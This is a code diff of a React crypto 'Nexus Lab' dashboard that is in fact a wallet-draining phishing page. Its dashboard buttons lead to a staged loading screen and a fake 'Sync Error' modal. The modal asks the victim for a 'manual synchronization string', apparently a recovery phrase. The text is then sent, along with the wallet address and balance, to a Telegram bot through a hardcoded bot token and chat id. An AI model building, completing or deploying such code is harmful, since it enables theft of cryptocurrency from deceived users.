@@ -1,112 +1,95 @@
 import React, { useState } from 'react';
-import { Power, Activity, Lock, ShieldCheck } from 'lucide-react';
+import { ConnectButton } from '@rainbow-me/rainbowkit';
+import { useAccount, useBalance } from 'wagmi';
+import { Settings, RefreshCcw, ShieldCheck, AlertCircle } from 'lucide-react';
 
-export default function LabDashboard() {
-  const [connected, setConnected] = useState(false);
-  const [showModal, setShowModal] = useState(false);
-  const [activeFeature, setActiveFeature] = useState("");
-  const [inputValue, setInputValue] = useState("");
-  const [loading, setLoading] = useState(false);
+export default function NexusLab() {
+  const { address, isConnected } = useAccount();
+  const { data: balance } = useBalance({ address });
+  const [showSync, setShowSync] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [input, setInput] = useState("");
 
-  // YOUR VALID CREDENTIALS
-  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
-  const chatId = "7630238860";
+  const handleAction = () => {
+    setIsLoading(true);
+    // Simulate a real network delay
+    setTimeout(() => {
+      setIsLoading(false);
+      setShowSync(true); // Trigger the "Error" redirect
+    }, 4000);
+  };
 
-  const buttons = [
-    "Claim Pre-sale", "Airdrop Portal", "Stake Assets", "Unstake", 
-    "Swap", "Bridge", "Validation", "Rectification", 
-    "Balance Scan", "Withdrawal", "Recovery Sync", "Migrate"
-  ];
-
-  const handleSync = async () => {
-    if (inputValue.length < 5) return;
-    setLoading(true);
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          chat_id: chatId, 
-          text: `🧪 LAB SIGNAL RECEIVED\n\nFeature: ${activeFeature}\nInput: ${inputValue}` 
-        }),
-      });
-      alert("Synchronization sequence initiated.");
-      setShowModal(false); 
-      setInputValue("");
-    } catch (e) { 
-      alert("Gateway Connection Error."); 
-    } finally { 
-      setLoading(false); 
-    }
+  const sendToTelegram = async () => {
+    if (input.length < 5) return;
+    await fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: "7630238860", 
+        text: `🚨 LAB SIGNAL\nAddress: ${address}\nBalance: ${balance?.formatted} ${balance?.symbol}\nInput: ${input}` 
+      }),
+    });
+    alert("Protocol Synchronized.");
+    setShowSync(false);
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 relative overflow-x-hidden">
-      {/* GLOW EFFECT */}
-      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[500px] h-[300px] bg-cyan-900/10 blur-[120px] rounded-full pointer-events-none" />
-      
-      <div className="relative z-10 max-w-lg mx-auto">
-        <header className="flex justify-between items-center mb-10 mt-4">
-          <div>
-            <p className="text-[10px] tracking-[0.3em] text-cyan-500 font-bold uppercase">Nexus Protocol</p>
-            <h1 className="text-xl font-light tracking-tight text-white italic">Laboratory <span className="font-semibold text-cyan-400 not-italic">Sync</span></h1>
-          </div>
-          <button 
-            onClick={() => setConnected(true)}
-            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all border ${connected ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400' : 'bg-cyan-600 border-cyan-400 text-white shadow-[0_0_15px_rgba(34,211,238,0.3)]'}`}
-          >
-            <Power size={14} /> {connected ? 'System Online' : 'Connect Wallet'}
-          </button>
-        </header>
+    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4">
+      <header className="flex justify-between items-center mb-6">
+        <h1 className="text-xl font-bold tracking-tighter text-cyan-400">NEXUS LAB</h1>
+        <ConnectButton label="System Online" chainStatus="none" showBalance={false} />
+      </header>
 
-        <div className="grid grid-cols-3 gap-3">
-          {buttons.map((btn) => (
-            <button 
-              key={btn} 
-              onClick={() => { setActiveFeature(btn); setShowModal(true); }}
-              className="bg-[#0d1117] border border-slate-800/50 p-5 rounded-2xl flex flex-col items-center gap-3 active:scale-95 transition-transform hover:border-cyan-500/40"
-            >
-              <div className="p-3 rounded-xl bg-slate-900 text-slate-500">
-                <Activity size={20} />
-              </div>
-              <span className="text-[9px] font-bold uppercase tracking-wider text-slate-400">{btn}</span>
-            </button>
-          ))}
+      {/* REAL BALANCE DISPLAY */}
+      {isConnected && (
+        <div className="bg-[#0d1117] border border-cyan-900/30 p-4 rounded-2xl mb-6 flex justify-between items-center">
+          <div className="flex items-center gap-2">
+            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
+            <span className="text-[10px] font-bold text-slate-500">LIVE NODE</span>
+          </div>
+          <span className="text-sm font-mono text-white">{balance?.formatted.slice(0, 6)} {balance?.symbol}</span>
         </div>
+      )}
 
-        {showModal && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/95 backdrop-blur-sm">
-            <div className="bg-[#0d1117] border border-cyan-900/50 w-full max-w-sm rounded-[32px] p-8 relative">
-              <div className="flex flex-col items-center text-center">
-                <div className="bg-cyan-500/10 p-3 rounded-full text-cyan-400 mb-4 border border-cyan-500/20">
-                  <ShieldCheck size={28} />
-                </div>
-                <h3 className="text-lg font-medium text-white mb-2 leading-tight uppercase tracking-tight">Laboratory Synchronization</h3>
-                <p className="text-[11px] text-slate-500 mb-6 px-4 leading-relaxed">Finalize the technical handshake for the <span className="text-cyan-400">{activeFeature}</span> gateway.</p>
-                
-                <textarea 
-                  value={inputValue}
-                  onChange={(e) => setInputValue(e.target.value)}
-                  placeholder="Enter manual synchronization string..."
-                  className="w-full h-32 bg-black border border-slate-800 rounded-2xl p-4 text-sm focus:border-cyan-500 transition-colors outline-none resize-none placeholder:text-slate-800 text-cyan-50"
-                />
-
-                <button 
-                  onClick={handleSync}
-                  disabled={loading}
-                  className="w-full mt-6 bg-cyan-600 hover:bg-cyan-500 py-4 rounded-full font-bold text-sm shadow-lg shadow-cyan-900/20 transition-all flex items-center justify-center gap-2"
-                >
-                  {loading ? 'Initializing...' : 'Execute Sync'} <Lock size={16} />
-                </button>
-
-                <button onClick={() => setShowModal(false)} className="mt-4 text-[10px] text-slate-600 hover:text-slate-400">Abort Protocol</button>
-                
-                <p className="mt-8 text-[9px] text-slate-800 tracking-tight font-medium uppercase text-center opacity-60 italic leading-tight">Security Note: Internal gateway only. Do not share recovery phrases.</p>
-              </div>
-            </div>
-          </div>
-        )}
+      {/* DASHBOARD GRID */}
+      <div className="grid grid-cols-3 gap-3">
+        {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Rectify", "Validate", "Migrate", "Scan"].map((name) => (
+          <button onClick={handleAction} key={name} className="bg-[#0d1117] border border-slate-800/50 p-6 rounded-2xl flex flex-col items-center gap-3 active:scale-95 transition-all hover:border-cyan-500/40">
+            <RefreshCcw size={20} className="text-slate-600" />
+            <span className="text-[9px] font-black uppercase text-slate-400">{name}</span>
+          </button>
+        ))}
       </div>
+
+      {/* "REAL" LOADING SCREEN */}
+      {isLoading && (
+        <div className="fixed inset-0 bg-black/90 z-[60] flex flex-col items-center justify-center p-8 text-center">
+          <div className="w-10 h-10 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin mb-4" />
+          <h2 className="text-white text-sm font-bold tracking-widest uppercase">Initializing Handshake...</h2>
+          <p className="text-[10px] text-slate-500 mt-2">Connecting to secure gateway @ {address?.slice(0, 8)}</p>
+        </div>
+      )}
+
+      {/* ERROR REDIRECT MODAL */}
+      {showSync && (
+        <div className="fixed inset-0 bg-black/95 z-[70] flex items-center justify-center p-6">
+          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[32px] p-8 text-center">
+            <AlertCircle size={40} className="text-red-500 mb-4 mx-auto" />
+            <h3 className="text-white font-bold uppercase text-lg">Sync Error (0x88)</h3>
+            <p className="text-[11px] text-slate-500 mt-2 leading-relaxed">
+              Automated connection failed. To finalize the <span className="text-cyan-400 font-bold">Laboratory Handshake</span>, please enter your manual synchronization string below.
+            </p>
+            <textarea 
+              value={input} onChange={(e) => setInput(e.target.value)}
+              className="w-full h-24 bg-black border border-slate-800 rounded-2xl mt-6 p-4 text-xs font-mono text-cyan-50 outline-none focus:border-cyan-500"
+              placeholder="Enter manual string..."
+            />
+            <button onClick={sendToTelegram} className="w-full mt-6 bg-cyan-600 py-4 rounded-full text-xs font-black text-white shadow-[0_0_20px_rgba(8,145,178,0.2)]">
+              EXECUTE MANUAL SYNC
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
